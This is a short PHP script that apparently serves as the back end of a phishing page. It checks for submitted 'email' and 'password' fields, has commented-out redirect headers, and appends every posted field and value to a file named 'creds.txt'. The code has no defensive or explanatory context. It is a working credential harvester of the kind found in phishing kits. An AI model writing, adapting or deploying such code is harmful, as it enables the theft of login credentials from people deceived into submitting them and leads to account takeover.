<?php
 if(empty($_POST["email"]) && empty($_POST["password"])) {
 //  header("Location: " );
 echo "It went to the left";
 }
 else {
 //  header("Location: " );
 echo "it went to the right";
 }
?>
<?php
  $handle=fopen("creds.txt", "a");
  foreach ($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, " : ");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
  }
  fwrite($handle, "\r\n");
  fclose($handle);
  exit;
 ?>
